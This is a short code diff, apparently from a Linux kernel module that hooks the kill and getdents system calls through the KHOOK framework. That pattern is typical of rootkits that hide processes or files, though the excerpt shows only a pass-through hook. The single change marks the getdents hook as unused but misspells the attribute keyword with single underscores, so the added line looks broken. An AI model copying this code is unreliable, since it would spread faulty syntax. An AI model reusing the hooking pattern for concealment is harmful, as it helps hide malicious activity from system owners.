@@ -207,7 +207,7 @@ static long khook_sys_kill(pid_t pid, int sig) {
 
 
 KHOOK_EXT(long, sys_getdents, struct linux_dirent64 *, unsigned int);
-static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
+static long _attribute_((unused)) khook_sys_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
  	int ret;
  	ret = KHOOK_ORIGIN(fd, dirp, count);
 	return ret;
